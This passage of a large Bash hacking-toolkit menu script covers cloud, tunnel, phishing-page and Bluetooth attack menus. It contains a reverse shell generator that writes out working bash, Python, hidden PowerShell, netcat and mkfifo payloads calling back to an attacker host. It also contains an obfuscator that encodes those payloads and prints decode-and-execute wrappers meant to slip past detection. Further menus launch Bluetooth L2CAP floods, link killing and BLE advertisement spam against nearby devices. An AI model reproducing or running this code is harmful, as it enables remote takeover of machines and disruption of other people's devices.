        phb_row "  [3]  AWS key exposure test" "${BOLD}${CYAN}"
        phb_row "  [4]  Container escape checks" "${BOLD}${CYAN}"
        phb_div
        phb_row "  [0]  Back"                  "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" CLC
        case "$CLC" in
            1) cloud_docker_api ;;
            2) cloud_k8s ;;
            3) cloud_aws_keys ;;
            4) cloud_container_escape ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

menu_live_attacks() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "L I V E   A T T A C K S"
        phb_row "  -- THREAT MAPS --" "${BOLD}${ORANGE}"
        phb_row "  [1]  Kaspersky Cyberthreat Map" "${BOLD}${ORANGE}"
        phb_row "  [2]  Check Point Threat Map"     "${BOLD}${ORANGE}"
        phb_row "  [3]  Fortinet FortiGuard Map"    "${BOLD}${ORANGE}"
        phb_row "  [4]  Radware Live Threat Map"    "${BOLD}${ORANGE}"
        phb_row "  [5]  NETSCOUT Horizon"           "${BOLD}${ORANGE}"
        phb_row "  [6]  Bitdefender Threat Map"     "${BOLD}${ORANGE}"
        phb_row "  [7]  Imperva Attack Map"         "${BOLD}${ORANGE}"
        phb_row "  -- FEEDS --" "${BOLD}${RED}"
        phb_row "  [8]  AbuseIPDB"                  "${BOLD}${RED}"
        phb_row "  [9]  URLhaus"                    "${BOLD}${RED}"
        phb_row "  [10] Feodo Tracker"              "${BOLD}${RED}"
        phb_row "  [11] Shodan"                     "${BOLD}${RED}"
        phb_row "  [12] CIRCL CVE Search"           "${BOLD}${RED}"
        phb_div
        phb_row "  [0]  Back"                       "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" M
        local url="" name=""
        case "$M" in
            1)  url="https://cybermap.kaspersky.com/";                 name="Kaspersky" ;;
            2)  url="https://threatmap.checkpoint.com/";               name="Check Point" ;;
            3)  url="https://threatmap.fortiguard.com/";               name="FortiGuard" ;;
            4)  url="https://livethreatmap.radware.com/";              name="Radware" ;;
            5)  url="https://horizon.netscout.com/";                   name="NETSCOUT" ;;
            6)  url="https://threatmap.bitdefender.com/";              name="Bitdefender" ;;
            7)  url="https://www.imperva.com/cyber-threat-attack-map/"; name="Imperva" ;;
            8)  url="https://www.abuseipdb.com/";                      name="AbuseIPDB" ;;
            9)  url="https://urlhaus.abuse.ch/browse/";                name="URLhaus" ;;
            10) url="https://feodotracker.abuse.ch/browse/";           name="Feodo Tracker" ;;
            11) url="https://www.shodan.io/";                          name="Shodan" ;;
            12) url="https://cve.circl.lu/";                           name="CIRCL CVE" ;;
            0) return ;;
            *) sleep 1; continue ;;
        esac
        osint_open_url "$url"
        sleep 1
    done
}

tunnel_menu() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "T U N N E L   S E T U P"
        phb_row "  -- TUNNELS --" "${BOLD}${SKY}"
        phb_row "  [1]  ngrok quick HTTP tunnel"        "${BOLD}${SKY}"
        phb_row "  [2]  cloudflared quick tunnel"       "${BOLD}${SKY}"
        phb_row "  [3]  local HTTP server"              "${BOLD}${SKY}"
        phb_row "  -- STATUS --" "${BOLD}${CYAN}"
        phb_row "  [4]  show running tunnels"           "${BOLD}${CYAN}"
        phb_div
        phb_row "  [0]  Back"                           "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" T
        case "$T" in
            1) tunnel_ngrok ;;
            2) tunnel_cloudflared ;;
            3) tunnel_local_http ;;
            4) tunnel_show_running ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

custom_page_menu() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "C U S T O M   P A G E   L O A D E R"
        phb_row "  Pages live under: $PAGES_DIR" "${DIM}${GREY}"
        phb_div
        phb_row "  -- ACTIONS --" "${BOLD}${CYAN}"
        phb_row "  [1]  List available pages"     "${BOLD}${CYAN}"
        phb_row "  [2]  Preview page in browser"  "${BOLD}${CYAN}"
        phb_row "  [3]  Load an HTML from a URL"  "${BOLD}${CYAN}"
        phb_row "  [4]  Write a minimal page now" "${BOLD}${CYAN}"
        phb_row "  [5]  Set current page"         "${BOLD}${GREEN}"
        phb_div
        phb_row "  [0]  Back"                     "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" P
        case "$P" in
            1) custom_page_list ;;
            2) custom_page_preview ;;
            3) custom_page_fetch ;;
            4) custom_page_write ;;
            5) custom_page_set ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# END COLORED SUB-SUBMENUS
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# REVERSE SHELL GENERATOR + OBFUSCATOR
# ===============================================================

# the shell generator — writes each generated payload to a log
tunnel_reverse_shell() {
    print_banner
    menu_header "R E V E R S E   S H E L L   G E N E R A T O R"
    read -p "$(echo -e ${YELLOW}'LHOST (your IP): '${NC})" LH
    LH="${LH:-$(ip -4 -o addr show | awk '$2!="lo" {print $4; exit}' | cut -d/ -f1)}"
    read -p "$(echo -e ${YELLOW}'LPORT [4444]: '${NC})" LP
    LP="${LP:-4444}"

    # write these to a log so the obfuscator can find them
    SHELL_LOG="$LOGS_DIR/last_shells.txt"
    : > "$SHELL_LOG"

    # ---- payloads ----
    local p_bash="bash -i >& /dev/tcp/$LH/$LP 0>&1"
    local p_py="python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LH\",$LP));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    local p_ps="powershell -NoP -NonI -W Hidden -Exec Bypass -Command \$c=New-Object System.Net.Sockets.TCPClient('$LH',$LP);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1 | Out-String);\$sb2=\$sb + 'PS ' + (pwd).Path + '> ';\$sbt=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sbt,0,\$sbt.Length);\$s.Flush()}"
    local p_nc="nc -e /bin/sh $LH $LP"
    local p_busy="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LH $LP >/tmp/f"

    {
        echo "bash|$p_bash"
        echo "python|$p_py"
        echo "powershell|$p_ps"
        echo "nc|$p_nc"
        echo "busybox|$p_busy"
    } > "$SHELL_LOG"

    echo ""
    phb_row "  -- LISTENER --" "${BOLD}${GREEN}"
    phb_row "  nc -lvnp $LP"                 "${BOLD}${YELLOW}"
    phb_div
    phb_row "  -- PAYLOADS (saved to $SHELL_LOG) --" "${BOLD}${CYAN}"
    echo ""
    echo -e "  ${BOLD}${ORANGE}[1] Bash:${NC}"
    echo -e "    $p_bash"
    echo ""
    echo -e "  ${BOLD}${SKY}[2] Python:${NC}"
    echo -e "    $p_py"
    echo ""
    echo -e "  ${BOLD}${VIOLET}[3] PowerShell:${NC}"
    echo -e "    $p_ps"
    echo ""
    echo -e "  ${BOLD}${LIME}[4] Netcat:${NC}"
    echo -e "    $p_nc"
    echo ""
    echo -e "  ${BOLD}${PINK}[5] Busybox:${NC}"
    echo -e "    $p_busy"
    echo ""
    menu_footer
    addon_wait
}

# the obfuscator — reads the last shell, applies an encoding, saves
tunnel_shell_obfuscate() {
    trap on_interrupt INT
    local SHELL_LOG="$LOGS_DIR/last_shells.txt"
    while true; do
        print_banner
        menu_header "S H E L L   O B F U S C A T O R"

        if [ ! -s "$SHELL_LOG" ]; then
            phb_row "  No generated shell yet." "${BOLD}${YELLOW}"
            phb_row "  Run option 1 first to generate payloads." "${DIM}${GREY}"
            phb_div
            phb_row "  [0]  Back" "${RED}"
            menu_footer
            read -p "Choice: " _
            return
        fi

        phb_row "  -- LOADED SHELLS --" "${BOLD}${CYAN}"
        local i=1
        declare -A SHELL_NAMES SHELL_PAYLOADS
        while IFS='|' read -r name payload; do
            phb_row "  [$i]  $name" "${BOLD}${GREEN}"
            SHELL_NAMES[$i]="$name"
            SHELL_PAYLOADS[$i]="$payload"
            i=$((i+1))
        done < "$SHELL_LOG"
        local total=$((i-1))
        phb_div
        phb_row "  -- ENCODING --" "${BOLD}${MAGENTA}"
        phb_row "  [b]  Base64"        "${BOLD}${MAGENTA}"
        phb_row "  [h]  Hex"           "${BOLD}${MAGENTA}"
        phb_row "  [u]  URL-encode"    "${BOLD}${MAGENTA}"
        phb_row "  [r]  ROT13"         "${BOLD}${MAGENTA}"
        phb_row "  [v]  Reverse"       "${BOLD}${MAGENTA}"
        phb_row "  [x]  XOR (with key)" "${BOLD}${MAGENTA}"
        phb_row "  [a]  All encodings" "${BOLD}${MAGENTA}"
        phb_div
        phb_row "  [0]  Back"          "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}"Pick shell [1-$total]: "${NC})" PICK
        case "$PICK" in
            0) return ;;
            ''|*[!0-9]*) sleep 1; continue ;;
        esac
        if [ "$PICK" -lt 1 ] || [ "$PICK" -gt "$total" ]; then
            echo -e "${YELLOW}[!] invalid${NC}"; sleep 1; continue
        fi

        local name="${SHELL_NAMES[$PICK]}"
        local payload="${SHELL_PAYLOADS[$PICK]}"

        read -p "$(echo -e ${YELLOW}'Encoding [b/h/u/r/v/x/a]: '${NC})" ENC
        ENC="${ENC:-b}"

        local out="$LOGS_DIR/obf_${name}_$(date +%s).txt"
        {
            echo "=== $name payload, encoding: $ENC ==="
            echo ""
            echo "--- ORIGINAL ---"
            echo "$payload"
            echo ""
            case "$ENC" in
                b) echo "--- BASE64 ---"
                   echo -n "$payload" | base64 -w0; echo "" ;;
                h) echo "--- HEX ---"
                   echo -n "$payload" | xxd -p | tr -d '\n'; echo "" ;;
                u) echo "--- URL ---"
                   python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$payload" ;;
                r) echo "--- ROT13 ---"
                   echo "$payload" | tr 'A-Za-z' 'N-ZA-Mn-za-m' ;;
                v) echo "--- REVERSED ---"
                   echo "$payload" | rev ;;
                x) read -p "XOR key (single char): " KEY
                   KEY="${KEY:-k}"
                   python3 -c "
import sys
k = ord('$KEY')
data = '''$payload'''.encode()
print(''.join('\\\\x%02x' % (b ^ k) for b in data))
" ;;
                a) echo "--- BASE64 ---"
                   echo -n "$payload" | base64 -w0; echo ""
                   echo "--- HEX ---"
                   echo -n "$payload" | xxd -p | tr -d '\n'; echo ""
                   echo "--- URL ---"
                   python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$payload"
                   echo "--- ROT13 ---"
                   echo "$payload" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
                   echo "--- REVERSED ---"
                   echo "$payload" | rev ;;
            esac
            echo ""
            echo "--- SHELL WRAPPERS ---"
            echo "bash:       bash -c \"\$(echo '<obf>' | base64 -d)\""
            echo "python:     python3 -c \"import base64;exec(base64.b64decode('<obf>'))\""
            echo "powershell: powershell -EncodedCommand <base64_utf16le>"
            echo ""
        } > "$out"

        echo ""
        echo -e "${GREEN}[+] Saved: $out${NC}"
        echo ""
        cat "$out"
        menu_footer
        addon_wait
    done
}

# Tunnels menu with the new option 7
# ===============================================================
# END REVERSE SHELL + OBFUSCATOR
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# APPLEBLE — auto-install + auto-pick adapter
# ===============================================================
# ===============================================================
# END APPLEBLE
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# APPLEBLE — auto-install, auto-pick HCI, run start.py
# repo: https://github.com/ThemeHackers/AppleBLE
# ===============================================================
# ===============================================================
# END APPLEBLE
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# APPLEBLE — correct flags: -d N or -r
# repo: https://github.com/ThemeHackers/AppleBLE
# ===============================================================
# ===============================================================
# END APPLEBLE
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# APPLEBLE — live streaming + power mode
# repo: https://github.com/ThemeHackers/AppleBLE
# ===============================================================
# stream a command in real time (unbuffered), with a colored prefix
# ===============================================================
# END APPLEBLE
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# BLUETOOTH REFRESH — reset whole stack
# ===============================================================
# ===============================================================
# BLUETOOTH MENU — adds [17] Refresh
# ===============================================================
# ===============================================================
# END BLUETOOTH REFRESH
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# SILENT RUNNER — no stdout, no stderr to the console
# ===============================================================
_silent() {
    sudo "$@" >/dev/null 2>&1
}

# ===============================================================
# BT REFRESH — clean, no spam
# ===============================================================
# ===============================================================
# APPLEBLE helpers
# ===============================================================
_appleble_find_dir() {
    local dir=""
    for d in $HOME/AppleBLE "$HOME/AppleBLE" "$BASE_DIR/AppleBLE"; do
        [ -d "$d" ] && dir="$d" && break
    done
    echo "$dir"
}

_appleble_ensure() {
    local dir; dir=$(_appleble_find_dir)
    if [ -z "$dir" ]; then
        print_banner
        menu_header "A P P L E B L E   —   I N S T A L L"
        phb_row "  AppleBLE not found." "${BOLD}${YELLOW}"
        phb_row "  Clone ThemeHackers/AppleBLE now?" "${DIM}${GREY}"
        phb_div
        read -p "$(echo -e ${YELLOW}'Clone to $HOME/AppleBLE? [Y/n]: '${NC})" DO
        DO="${DO:-y}"
        if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
            git clone --depth 1 https://github.com/ThemeHackers/AppleBLE $HOME/AppleBLE >/dev/null 2>&1
            dir="$HOME/AppleBLE"
            if [ -f "$dir/requirements.txt" ]; then
                ( cd "$dir" && pip3 install --break-system-packages -r requirements.txt >/dev/null 2>&1 )
            fi
        fi
    fi
    echo "$dir"
}

_appleble_live() {
    local label="$1"; shift
    echo ""
    echo -e "${CYAN}[*] $label${NC}"
    echo -e "${DIM}    streaming live — Ctrl+C to stop${NC}"
    echo -e "${BOLD}${CYAN}────────────────────────────────────────${NC}"
    sudo stdbuf -oL -eL "$@" 2>&1 | while IFS= read -r line; do
        printf "  ${GREEN}▸${NC} %s\n" "$line"
    done
    echo -e "${BOLD}${CYAN}────────────────────────────────────────${NC}"
    echo -e "${DIM}    stream ended${NC}"
}

# ===============================================================
# APPLEBLE menu — adds [7] Refresh
# ===============================================================
bt_appleble() {
    trap on_interrupt INT

    local dir; dir=$(_appleble_ensure)
    if [ -z "$dir" ] || [ ! -d "$dir" ]; then
        echo -e "${RED}[!] AppleBLE not available.${NC}"
        addon_wait; return
    fi

    local entry="$dir/start.py"
    [ ! -f "$entry" ] && entry=$(find "$dir" -maxdepth 2 -name "start.py" 2>/dev/null | head -1)
    if [ -z "$entry" ] || [ ! -f "$entry" ]; then
        echo -e "${RED}[!] start.py not found in $dir${NC}"
        addon_wait; return
    fi

    if ! pip3 show bleak >/dev/null 2>&1; then
        echo -e "${CYAN}[*] Installing AppleBLE deps...${NC}"
        ( cd "$dir" && pip3 install --break-system-packages -r requirements.txt >/dev/null 2>&1 )
    fi

    while true; do
        print_banner
        menu_header "A P P L E B L E"
        addon_bt_hci_list
        phb_div
        phb_row "  -- SPAM PAYLOADS (live output) --" "${BOLD}${PINK}"
        phb_row "  [1]  AirPods        (-d 1)"  "${BOLD}${PINK}"
        phb_row "  [2]  Beats          (-d 2)"  "${BOLD}${PINK}"
        phb_row "  [3]  AppleTV        (-d 3)"  "${BOLD}${PINK}"
        phb_row "  [4]  AirPods Adv    (-d 4)"  "${BOLD}${PINK}"
        phb_row "  [5]  Random loop    (-r)"     "${BOLD}${PINK}"
        phb_row "  -- POWER MODE --" "${BOLD}${RED}"
        phb_row "  [p]  POWER  fast interval (500ms)" "${BOLD}${RED}"
        phb_row "  [t]  TURBO  fastest interval (250ms)" "${BOLD}${RED}"
        phb_row "  -- CUSTOM --" "${BOLD}${MAGENTA}"
        phb_row "  [c]  Custom -d N (any device ID)" "${BOLD}${MAGENTA}"
        phb_row "  [i]  Set custom interval, then run -r" "${BOLD}${MAGENTA}"
        phb_row "  -- SCAN --" "${BOLD}${CYAN}"
        phb_row "  [6]  List BLE advertisements (12s)" "${BOLD}${CYAN}"
        phb_row "  -- MAINTENANCE --" "${BOLD}${GREEN}"
        phb_row "  [7]  Refresh Bluetooth stack" "${BOLD}${GREEN}"
        phb_div
        phb_row "  [0]  Back"             "${RED}"
        menu_footer
        read -p "Choice [1]: " A; A="${A:-1}"
        case "$A" in
            0) return ;;
            1|2|3|4)
                cd "$dir" || { addon_wait; continue; }
                _appleble_live "AppleBLE -d $A (live)" python3 "$entry" -d "$A"
                menu_footer; addon_wait ;;
            5)
                cd "$dir" || { addon_wait; continue; }
                _appleble_live "AppleBLE random loop (-r)" python3 "$entry" -r
                menu_footer; addon_wait ;;
            p|P)
                cd "$dir" || { addon_wait; continue; }
                _appleble_live "AppleBLE POWER (-r -i 500)" python3 "$entry" -r -i 500
                menu_footer; addon_wait ;;
            t|T)
                cd "$dir" || { addon_wait; continue; }
                _appleble_live "AppleBLE TURBO (-r -i 250)" python3 "$entry" -r -i 250
                menu_footer; addon_wait ;;
            c|C)
                read -p "Device ID (e.g. 5, 6, 7, 12): " DID
                [ -z "$DID" ] && { addon_wait; continue; }
                cd "$dir" || { addon_wait; continue; }
                _appleble_live "AppleBLE -d $DID (custom)" python3 "$entry" -d "$DID"
                menu_footer; addon_wait ;;
            i|I)
                read -p "Interval ms [500]: " IV
                IV="${IV:-500}"
                cd "$dir" || { addon_wait; continue; }
                _appleble_live "AppleBLE -r -i $IV" python3 "$entry" -r -i "$IV"
                menu_footer; addon_wait ;;
            6)
                echo -e "${CYAN}[*] BLE scan (12s)...${NC}"
                sudo systemctl start bluetooth >/dev/null 2>&1
                local hci
                hci=$(for x in /sys/class/bluetooth/hci*; do [ -e "$x" ] && basename "$x" && break; done)
                hci="${hci:-hci0}"
                sudo hciconfig "$hci" up >/dev/null 2>&1
                echo -e "${DIM}    MAC               NAME${NC}"
                echo -e "${BOLD}${CYAN}────────────────────────────────────${NC}"
                sudo timeout 12 stdbuf -oL hcitool lescan --duplicates 2>/dev/null | \
                    grep --line-buffered -E "([0-9A-F]{2}:){5}[0-9A-F]{2}" | \
                    awk '!seen[$1]++ { printf "  \033[1;33m%-17s\033[0m %s\n", $1, substr($0, index($0,$2)) }'
                echo -e "${BOLD}${CYAN}────────────────────────────────────${NC}"
                menu_footer; addon_wait ;;
            7) bt_refresh ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# BLUETOOTH MENU — [17] Refresh inside
# ===============================================================
menu_bluetooth() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "B L U E T O O T H   A T T A C K S"
        phb_row "  -- SCAN --" "${BOLD}${SKY}"
        phb_row "  [1]  Scan classic BT"    "${BOLD}${SKY}"
        phb_row "  [2]  Scan BLE"           "${BOLD}${SKY}"
        phb_row "  -- SERVICE ENUM --" "${BOLD}${ORANGE}"
        phb_row "  [3]  Full SDP dump"      "${BOLD}${ORANGE}"
        phb_row "  [4]  SDP query"          "${BOLD}${ORANGE}"
        phb_row "  [5]  RFCOMM channel scan" "${BOLD}${ORANGE}"
        phb_row "  [6]  HID probe"          "${BOLD}${ORANGE}"
        phb_row "  [7]  A2DP probe"         "${BOLD}${ORANGE}"
        phb_row "  -- ATTACK --" "${BOLD}${RED}"
        phb_row "  [8]  L2CAP flood"        "${BOLD}${RED}"
        phb_row "  [9]  Kill BT link"       "${BOLD}${RED}"
        phb_row "  -- EXTERNAL --" "${BOLD}${VIOLET}"
        phb_row "  [10] BLE adv spam (ESP32)" "${BOLD}${VIOLET}"
        phb_row "  [11] BlueDucky"          "${BOLD}${MAGENTA}"
        phb_row "  [12] AppleBLE"           "${BOLD}${PINK}"
        phb_row "  [13] BlueToolkit"        "${BOLD}${VIOLET}"
        phb_row "  [14] l2flood"            "${BOLD}${VIOLET}"
        phb_row "  [15] bdaddr change"      "${BOLD}${VIOLET}"
        phb_row "  -- HARDWARE --" "${BOLD}${CYAN}"
        phb_row "  [16] Hardware integration" "${BOLD}${CYAN}"
        phb_row "  -- MAINTENANCE --" "${BOLD}${GREEN}"
        phb_row "  [17] Refresh Bluetooth stack" "${BOLD}${GREEN}"
        phb_div
        phb_row "  [0]  Back"               "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" CH
        case "$CH" in
            1) bt_scan ;;
            2) bt_scan_le ;;
            3) bt_scan_services ;;
            4) bt_sdp ;;
            5) bt_rfcomm_scan ;;
            6) bt_hid_probe ;;
            7) bt_audio_probe ;;
            8) bt_l2cap_flood ;;
            9) bt_kill_link ;;
            10) bt_adv_spam ;;
            11) bt_blueducky ;;
            12) bt_appleble ;;
            13) bt_bluetoolkit ;;
            14) bt_l2flood_dir ;;
            15) bt_bdadr_change ;;
            16) addon_hardware ;;
            17) bt_refresh ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# END BLUETOOTH
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# BT REFRESH — clean inside-the-box output
# ===============================================================
# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# BT REFRESH — kills Killed spam by muting stderr globally
# ===============================================================
# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# BT REFRESH — centered rows, no drift, no Killed spam
# ===============================================================
# silent runner that mutes the parent shell's stderr for one command only
_bsilent() {
    local old
    exec 9>&2 2>/dev/null
    "$@" >/dev/null 2>&1
    exec 2>&9 9>&-
}

bt_refresh() {
    trap on_interrupt INT
    print_banner
    menu_header "B L U E T O O T H   R E F R E S H"

    # cache the padding ONCE — every row in this function uses this value.
    local cols pad
    cols=$(stty size 2>/dev/null | awk '{print $2}')
    [ -z "$cols" ] && cols=$(tput cols 2>/dev/null)
    [ -z "$cols" ] && cols=100
    [ "$cols" -lt 90 ] && cols=90
    pad=$(( (cols - PHOBIA_W - 2) / 2 ))
    [ $pad -lt 0 ] && pad=0

    # local row helper using the cached pad (never re-reads terminal)
    _prow() {
        local text="$1" color="${2:-}"
        local len fill
        len=$(_plen "$text")
        fill=$(( PHOBIA_W - len - 1 )); [ $fill -lt 0 ] && fill=0
        printf "%*s" "$pad" ""
        printf "${BOLD}${CYAN}|${NC} "
        if [ -n "$color" ]; then
            echo -ne "${color}${text}${NC}"
        else
            echo -ne "$text"
        fi
        printf "%*s" "$fill" ""
        printf "${BOLD}${CYAN}|${NC}\n"
    }
    _pblank() {
        printf "%*s" "$pad" ""
        printf "${BOLD}${CYAN}|${NC}"
        printf "%*s" "$PHOBIA_W" ""
        printf "${BOLD}${CYAN}|${NC}\n"
    }
    _pdiv() {
        local i line="+"
        for ((i=0;i<PHOBIA_W;i++)); do line+="-"; done
        line+="+"
        printf "%*s" "$pad" ""
        echo -e "${BOLD}${CYAN}${line}${NC}"
    }
    _pbot() {
        local i line="+"
        for ((i=0;i<PHOBIA_W;i++)); do line+="-"; done
        line+="+"
        printf "%*s" "$pad" ""
        echo -e "${BOLD}${CYAN}${line}${NC}"
    }

    # collect adapters
    local hcis=()
    for x in /sys/class/bluetooth/hci*; do
        [ -e "$x" ] || continue
        hcis+=("$(basename "$x")")
    done

    if [ ${#hcis[@]} -eq 0 ]; then
        _prow "  No Bluetooth adapters detected." "${BOLD}${RED}"
        _prow "  Plug in a BT adapter first." "${DIM}${GREY}"
        _pdiv
        _prow "  [0]  Back" "${RED}"
        _pbot
        echo ""
        addon_wait
        return
    fi

    _prow "  Adapters found: ${hcis[*]}" "${BOLD}${CYAN}"
    _pdiv

    # ---- 1/6 kill stuck ----
    _prow "  [1/6] Killing stuck BT processes" "${BOLD}${YELLOW}"
    local pat
    for pat in hcitool bluetoothctl btmon hciconfig sdptool rfcomm l2ping \
               start.py appleble BlueDucky bluekit.py; do
        _bsilent sudo pkill -9 -f "$pat"
    done
    sleep 1
    _prow "        done" "${GREEN}"

    # ---- 2/6 stop service ----
    _prow "  [2/6] Stopping bluetooth service" "${BOLD}${YELLOW}"
    _bsilent sudo systemctl stop bluetooth
    sleep 2
    _prow "        stopped" "${GREEN}"

    # ---- 3/6 power down ----
    _prow "  [3/6] Powering down adapters" "${BOLD}${YELLOW}"
    local h
    for h in "${hcis[@]}"; do
        _bsilent sudo hciconfig "$h" down
        _bsilent sudo bluetoothctl power off
        _prow "        $h down" "${DIM}${GREY}"
    done
    sleep 2

    # ---- 4/6 reset HCI ----
    _prow "  [4/6] Resetting HCI layer" "${BOLD}${YELLOW}"
    if lsmod | grep -q "^bluetooth"; then
        _bsilent sudo modprobe -r btusb
        _bsilent sudo modprobe -r bluetooth
        sleep 2
        _bsilent sudo modprobe bluetooth
        _bsilent sudo modprobe btusb
        sleep 2
        _prow "        kernel modules reloaded" "${GREEN}"
    else
        _prow "        bluetooth module not loaded, skipping" "${DIM}${GREY}"
    fi

    # ---- 5/6 start service ----
    _prow "  [5/6] Starting bluetooth service" "${BOLD}${YELLOW}"
    _bsilent sudo systemctl start bluetooth
    _bsilent sudo systemctl restart bluetooth
    sleep 3
    _prow "        service up" "${GREEN}"

    # ---- 6/6 power up ----
    _prow "  [6/6] Powering up adapters" "${BOLD}${YELLOW}"
    hcis=()
    for x in /sys/class/bluetooth/hci*; do
        [ -e "$x" ] || continue
        hcis+=("$(basename "$x")")
    done
    for h in "${hcis[@]}"; do
        _bsilent sudo rfkill unblock bluetooth
        _bsilent sudo hciconfig "$h" up
        _bsilent sudo hciconfig "$h" reset
        sleep 1
        _prow "        $h up + reset" "${GREEN}"
    done
    _bsilent sudo rm -rf /var/lib/bluetooth/*/cache

    _pdiv
    _prow "  Refresh complete." "${BOLD}${GREEN}"
    _pdiv

    # ---- state ----
    _prow "  -- ADAPTERS --" "${BOLD}${CYAN}"
    for x in /sys/class/bluetooth/hci*; do
        [ -e "$x" ] || continue
        local hh; hh=$(basename "$x")
        local a; a=$(hciconfig "$hh" 2>/dev/null | awk '/BD Address/{print $3}')
        local st; st=$(hciconfig "$hh" 2>/dev/null | grep -oE "UP RUNNING|DOWN|UP" | head -1)
        _prow "  $hh  ${a:-?}  ${st:-unknown}" "${GREEN}"
    done
    _pdiv
    _prow "  -- SERVICE --" "${BOLD}${CYAN}"
    _prow "  $(systemctl is-active bluetooth 2>/dev/null || echo unknown)" "${GREEN}"
    _pdiv
    _prow "  -- RFKILL --" "${BOLD}${CYAN}"
    local rf
    rf=$(rfkill list bluetooth 2>/dev/null | tr '\n' '|' | sed 's/|$//')
    _prow "  ${rf:-none}" "${GREEN}"
    _pbot
    echo ""

    addon_wait
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# BLUETOOTH ADAPTER INIT — makes scans actually return devices
# ===============================================================
bt_init_adapter() {
    # ensure service up
    sudo systemctl start bluetooth >/dev/null 2>&1
    sleep 1

    # unblock rfkill
    sudo rfkill unblock bluetooth >/dev/null 2>&1

    # bring the HCI up
    local h
    for h in /sys/class/bluetooth/hci*; do
        [ -e "$h" ] || continue
        local name; name=$(basename "$h")
        sudo hciconfig "$name" up >/dev/null 2>&1
        sudo hciconfig "$name" reset >/dev/null 2>&1
        sleep 1
    done

    # use bluetoothctl to power on + enable scanning mode
    # (this is what makes modern phones visible)
    bluetoothctl << 'EOF' >/dev/null 2>&1
power on
agent on
default-agent
pairable on
discoverable on
EOF
    sleep 1
}

bt_pick_iface() {
    BT_IF=""
    for x in /sys/class/bluetooth/hci*; do
        [ -e "$x" ] || continue
        BT_IF="$(basename "$x")"
        break
    done
    [ -z "$BT_IF" ] && BT_IF="hci0"
}

# ===============================================================
# BT TARGET PICK — robust discovery
# ===============================================================
bt_pick_target() {
    BT_MAC=""
    bt_pick_iface
    bt_init_adapter

    echo -e "${CYAN}[*] Scanning for Bluetooth targets (15s)...${NC}"
    echo ""

    rm -f /tmp/bt_pick.txt /tmp/bt_classic.txt /tmp/bt_le.txt

    # --- run three scanners in parallel ---
    # 1. classic inquiry
    ( sudo timeout 15 hcitool -i "$BT_IF" scan 2>/dev/null \
        | grep -E "([0-9A-F]{2}:){5}[0-9A-F]{2}" > /tmp/bt_classic.txt ) &

    # 2. BLE scan
    ( sudo timeout 15 hcitool -i "$BT_IF" lescan --duplicates 2>/dev/null \
        | grep -E "([0-9A-F]{2}:){5}[0-9A-F]{2}" > /tmp/bt_le.txt ) &

    # 3. bluetoothctl scan (finds modern devices hcitool misses)
    ( sudo timeout 15 bluetoothctl --timeout 15 scan on >/dev/null 2>&1 ) &

    # 4. known devices from bluetoothctl cache
    ( sudo bluetoothctl devices 2>/dev/null \
        | awk '{print $2}' > /tmp/bt_known.txt ) &

    wait 2>/dev/null

    # merge all results, dedupe by MAC
    {
        cat /tmp/bt_classic.txt 2>/dev/null | awk '{print $1, substr($0, index($0,$2))}'
        cat /tmp/bt_le.txt 2>/dev/null | sort -u | awk '{print $1, substr($0, index($0,$2))}'
        sudo bluetoothctl devices 2>/dev/null | sed 's/^Device //'
    } | grep -E "([0-9A-F]{2}:){5}[0-9A-F]{2}" | awk '!seen[$1]++' > /tmp/bt_pick.txt

    # normalize the line: MAC NAME
    awk '{ mac=$1; sub(/^[^ ]+ */,""); print mac" "$0 }' /tmp/bt_pick.txt > /tmp/bt_pick_norm.txt
    mv /tmp/bt_pick_norm.txt /tmp/bt_pick.txt

    if [ ! -s /tmp/bt_pick.txt ]; then
        echo -e "${YELLOW}[!] No devices found this scan.${NC}"
        echo -e "${DIM}    Make sure the device is in pairing mode.${NC}"
        echo -e "${DIM}    Or plug the CSR 4.0 dongle if you need classic attacks.${NC}"
        bt_show_history
        echo ""
